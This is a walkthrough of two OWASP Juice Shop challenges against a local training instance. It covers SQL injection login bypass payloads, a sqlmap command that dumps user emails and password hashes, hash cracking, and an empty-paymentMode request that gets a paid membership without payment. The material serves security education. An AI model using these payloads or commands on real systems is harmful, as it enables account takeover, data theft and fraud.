# Challenge #1 – SQL Injection Attack Chain

> **Category:** Injection  
> **Difficulty:** ⭐⭐⭐  
> **Tools:** sqlmap, Burp Suite Repeater  
> **Video:** ▶ [Watch on Loom](https://loom.com/TBD)

---

## Table of Contents

- [Overview](#overview)
- [Vulnerability Description](#vulnerability-description)
- [Challenge 1.1 – Login as Jim](#challenge-11--login-as-jim)
  - [Reconnaissance](#reconnaissance)
  - [Walkthrough – Manual (Burp Suite)](#walkthrough--manual-burp-suite)
  - [Walkthrough – Automated (sqlmap)](#walkthrough--automated-sqlmap)
- [Challenge 1.2 – Deluxe Fraud](#challenge-12--deluxe-fraud)
  - [Walkthrough – Burp Suite Repeater](#walkthrough--burp-suite-repeater)
- [References](#references)

---

## Overview

This writeup covers an end-to-end SQL Injection attack chain against the OWASP Juice Shop.
The chain consists of two linked challenges:

1. **Login as Jim** — bypass authentication via SQL Injection to log in as a known user (`jim@juice-sh.op`)
2. **Deluxe Fraud** — abuse the authenticated session to fraudulently obtain a Deluxe Membership without payment

Both challenges are performed against a clean (no progress) local Docker instance running on `http://localhost:4000`.

---

## Vulnerability Description

**SQL Injection (SQLi)** occurs when user-supplied input is embedded directly into an SQL query without proper sanitization or parameterization. An attacker can inject SQL syntax that alters the logic of the query — for example, bypassing a `WHERE` clause entirely to log in as any user without knowing their password.

The classic login bypass payload is:

```sql
' OR 1=1--
```

This turns a query like:

```sql
SELECT * FROM Users WHERE email = 'input' AND password = 'input'
```

Into:

```sql
SELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '...'
```

The `--` comments out the rest of the query. Since `1=1` is always true, the first user in the database is returned — which in Juice Shop is the admin account. To target Jim specifically, the email field is used directly:

```sql
jim@juice-sh.op'--
```

Into:
```sql
SELECT * FROM Users WHERE email = 'jim@juice-sh.op' --' AND password = 'input'
```

---

## Challenge 1.1 – Login as Jim

### Reconnaissance

Jim's email address can be discovered through the Juice Shop's product reviews, which are visible without authentication. Navigate to any product and inspect the reviews — Jim has left a review with his full email address `jim@juice-sh.op` visible in the response. In our case Jim has written a feedback for the 'Green Smoothie'.

Alternatively, intercept the product API response in Burp Suite:

```
GET /rest/products/22/reviews HTTP/1.1
Host: localhost:4000
```

The response contains user data including email addresses in plaintext.

---

### Walkthrough – Manual (Burp Suite)

**Step 1 – Intercept the login request**

1. Open Burp Suite → enable the Proxy intercept
2. Navigate to `http://localhost:4000/#/login`
3. Enter any credentials and click **Log in**
4. Burp Suite captures the following request:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{"email":"test@test.com","password":"test"}
```

**Step 2 – Send to Repeater**

Right-click the request → **Send to Repeater** (`Ctrl+R`)

**Step 3 – Inject the payload**

Modify the email field with the SQLi payload:

```json
{"email":"jim@juice-sh.op'--","password":"anything"}
```

The `'--` closes the SQL string and comments out the password check entirely.

**Step 4 – Send the request**

Click **Send**. The response returns a valid authentication token:

```json
{
  "authentication": {
    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
    "bid": 2,
    "umail": "jim@juice-sh.op"
  }
}
```

**Step 5 – Verify in browser**

Copy the token from the response and paste it into the browser's local storage under the key `token`, then reload the page — you are now logged in as Jim.

---

### Walkthrough – Automated (sqlmap)

**Step 1 – Export the login request from Burp Suite**

In Burp Suite Proxy History, right-click the login request → **Copy to file** → save as `login-request.txt`

The file content:

```
POST /rest/user/login HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{"email":"jim@juice-sh.op","password":"test1234"}
```

**Step 2 – Run sqlmap**

**Linux / macOS:**
```bash
sqlmap -r login_request.txt \
  -p email \
  --flush-session \
  --ignore-code=401,500 \
  --technique=B \
  --level=3 \
  --risk=2 \
  --threads=10 \
  --batch \
  --dump \
  -T Users \
  -C "id,email,password,role,username" \
  --where="email LIKE '%jim%'" \
  2>&1
```

**Windows (PowerShell):**
```powershell
sqlmap -r login_request.txt `
  -p email `
  --flush-session `
  --ignore-code=401,500 `
  --technique=B `
  --level=3 `
  --risk=2 `
  --threads=10 `
  --batch `
  --dump `
  -T Users `
  -C "id,email,password,role,username" `
  --where="email LIKE '%jim%'" `
  2>&1
```

Key flags explained:

| Flag | Purpose |
|------|---------|
| `-r login_request.txt` | Read the HTTP request from a Burp-exported file instead of specifying a URL directly |
| `-p email` | Explicitly target the `email` field in the JSON body for injection |
| `--flush-session` | Clear cached session data from previous runs to ensure a clean start |
| `--ignore-code=401,500` | Do not abort when Juice Shop returns 401/500 — these are expected responses |
| `--technique=B` | Boolean-based blind injection only — skips other techniques to save time |
| `--level=3` | Required minimum to detect injection points inside JSON POST body parameters |
| `--risk=2` | Allows more aggressive payloads while avoiding data-modifying queries |
| `--threads=10` | 10 parallel requests — significantly speeds up boolean-blind bit-by-bit extraction |
| `--batch` | Non-interactive mode — all prompts are answered with defaults automatically |
| `--dump` | Extract and display the contents of the target table |
| `-T Users` | Target only the `Users` table |
| `-C "id,email,password,role,username"` | Specify columns explicitly — required because SQLite has no `information_schema` |
| `--where="email LIKE '%jim%'"` | SQL filter to extract only Jim's record, reducing extraction time drastically |
| `2>&1` | Redirect stderr to stdout so errors and output appear together in the terminal |


**Step 3 – Results**

sqlmap identifies the vulnerable parameter and dumps the Users table, revealing hashed passwords and email addresses for all registered users — including Jim.

Jim's password hash can be cracked using [CrackStation](https://crackstation.net/), revealing the plaintext password: `ncc-1701`

---

## Challenge 1.2 – Deluxe Fraud

### Overview

With Jim's session active, the goal is to obtain a **Deluxe Membership** without actually paying for it. The Juice Shop frontend enforces payment through the UI, but the underlying API endpoint lacks proper server-side validation.

### Walkthrough – Burp Suite Repeater

**Step 1 – Navigate to the Deluxe Membership page**

While logged in as Jim, navigate to:

```
http://localhost:4000/#/deluxe-membership
```

The page shows a payment form. Intercept what happens when you attempt to upgrade.

**Step 2 – Intercept the upgrade request**

With Burp Suite Proxy active, click the upgrade button. The intercepted request:

```http
POST /rest/deluxe-membership HTTP/1.1
Host: localhost:4000
Authorization: Bearer <jim's token>
Content-Type: application/json

{"paymentMode":"wallet"}
```

**Step 3 – Modify the payment mode**

Send to Repeater and change the `paymentMode` value:

```json
{"paymentMode":""}
```

Sending an empty payment mode bypasses the server-side payment validation entirely.

**Step 4 – Send the request**

The server responds with:

```json
{
  "status": "success",
  "data": {
    "membershipType": "deluxe"
  }
}
```

Jim now has Deluxe Membership without any payment being processed.

---

## References

- [OWASP – SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Top 10 – A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [sqlmap Documentation](https://sqlmap.org/)
- [PortSwigger – SQL Injection](https://portswigger.net/web-security/sql-injection)
- [CrackStation – Hash Lookup](https://crackstation.net/)

---